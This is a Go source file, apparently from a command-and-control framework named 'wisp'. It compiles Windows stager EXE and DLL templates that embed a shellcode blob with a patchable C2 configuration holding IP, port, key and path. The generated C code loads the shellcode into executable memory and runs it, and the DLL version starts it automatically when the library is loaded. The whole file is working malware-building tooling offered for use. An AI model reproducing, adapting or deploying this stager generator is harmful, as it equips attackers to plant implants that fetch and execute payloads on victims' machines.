// Command gen_stager_templates precompiles the C stager EXE + DLL templates
// with a placeholder (sentinel) config block, so payload generation at runtime
// only needs a binary config patch — no compiler required on the deployment
// box. Run once at build/CI time (needs mingw-w64):
//
//	go run ./cmd/gen_stager_templates
//
// Outputs: bin/templates/stager_c_template.exe, bin/templates/stager_c_template.dll
package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/user/wisp/internal/stager"
)

// Sentinel values baked into the placeholder config block. The generator
// locates the config region in the compiled binary by searching for the
// sentinel key (0xCC x32) + sentinel path, then overwrites ip/port/key/path.
const (
	sentinelIP   = "1.2.3.4"
	sentinelPort = 48879 // 0xBEEF
	sentinelPath = "/WISP_SENTINEL/"
)

// sentinelKey is 32 bytes of 0xCC.
func sentinelKey() []byte {
	k := make([]byte, 32)
	for i := range k {
		k[i] = 0xCC
	}
	return k
}

// placeholderBlob builds the blob embedded in the precompiled templates.
func placeholderBlob() ([]byte, error) {
	ip, err := stager.ResolveIP(sentinelIP)
	if err != nil {
		return nil, err
	}
	return stager.Build(stager.Config{
		IP:   ip,
		Port: sentinelPort,
		Key:  sentinelKey(),
		Path: sentinelPath,
	})
}

func cArray(name string, data []byte) string {
	var b strings.Builder
	b.WriteString(fmt.Sprintf("unsigned char %s[] = {\n", name))
	for i, c := range data {
		if i%12 == 0 {
			b.WriteString("\n")
		}
		fmt.Fprintf(&b, "0x%02x, ", c)
	}
	b.WriteString("\n};\n")
	return b.String()
}

func main() {
	if gcc, err := exec.LookPath("x86_64-w64-mingw32-gcc"); err != nil {
		fmt.Println("error: x86_64-w64-mingw32-gcc not found in PATH")
		os.Exit(1)
	} else {
		fmt.Printf("using %s\n", gcc)
	}

	blob, err := placeholderBlob()
	if err != nil {
		fmt.Println("build placeholder blob:", err)
		os.Exit(1)
	}
	fmt.Printf("placeholder blob: %d bytes (stub=%d, config=%d)\n", len(blob), len(blob)-170, 170)

	// Confirm the sentinel is unique/identifiable. The 170-byte config block:
	// magic "WISP"(LE 57 49 53 50) ip(4) port(2) key(32) path(128, NUL padded).
	needle := make([]byte, 170)
	copy(needle, blob[len(blob)-170:])
	idx := bytes.Index(blob, needle)
	if idx < 0 {
		fmt.Println("error: sentinel not found in blob")
		os.Exit(1)
	}
	fmt.Printf("sentinel config offset in blob: %d (expect %d)\n", idx, len(blob)-170)

	binDir, err := filepath.Abs("bin/templates")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	if err := os.MkdirAll(binDir, 0755); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	gcc := "x86_64-w64-mingw32-gcc"

	// ---- EXE template ----
	exeSrc := "/* generated template; config is patched at payload time */\n" +
		"#include <windows.h>\n#include <string.h>\n\n" +
		cArray("SC", blob) +
		"\nint main(void) {\n" +
		"\tvoid* m = VirtualAlloc(0, sizeof(SC), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n" +
		"\tif (!m) return 1;\n\tmemcpy(m, SC, sizeof(SC));\n\t((void(*)(void))m)();\n\treturn 0;\n}\n"
	exeOut := filepath.Join(binDir, "stager_c_template.exe")
	compile(gcc, "-O1", "-s", "-o", exeOut, writeTempC(exeSrc))
	fmt.Printf("EXE template: %s (%d bytes)\n", exeOut, fileSize(exeOut))

	// ---- DLL template ----
	dllSrc := "#include <windows.h>\n#include <string.h>\n\n" +
		cArray("SC", blob) +
		"\nstatic void run_stager(void) {\n" +
		"\tvoid* m = VirtualAlloc(0, sizeof(SC), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n" +
		"\tif (!m) return;\n\tmemcpy(m, SC, sizeof(SC));\n\t((void(*)(void))m)();\n}\n" +
		"\nstatic DWORD WINAPI worker(LPVOID p) { (void)p; run_stager(); return 0; }\n" +
		"\n__declspec(dllexport) void StartStager(void) {\n" +
		"\tHANDLE t = CreateThread(NULL, 0, worker, NULL, 0, NULL);\n\tif (t) CloseHandle(t);\n}\n" +
		"\nBOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {\n" +
		"\t(void)h; (void)r;\n\tif (reason == DLL_PROCESS_ATTACH) StartStager();\n\treturn TRUE;\n}\n"
	dllOut := filepath.Join(binDir, "stager_c_template.dll")
	compile(gcc, "-shared", "-O1", "-s", "-o", dllOut, writeTempC(dllSrc))
	fmt.Printf("DLL template: %s (%d bytes)\n", dllOut, fileSize(dllOut))
}

func writeTempC(src string) string {
	f, err := os.CreateTemp("", "stager_tpl_*.c")
	if err != nil {
		panic(err)
	}
	defer f.Close()
	f.WriteString(src)
	return f.Name()
}

func compile(gcc string, args ...string) {
	cmd := exec.Command(gcc, args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("gcc error: %v\n%s\n", err, string(out))
		os.Exit(1)
	}
}

func fileSize(p string) int {
	if fi, err := os.Stat(p); err == nil {
		return int(fi.Size())
	}
	return -1
}
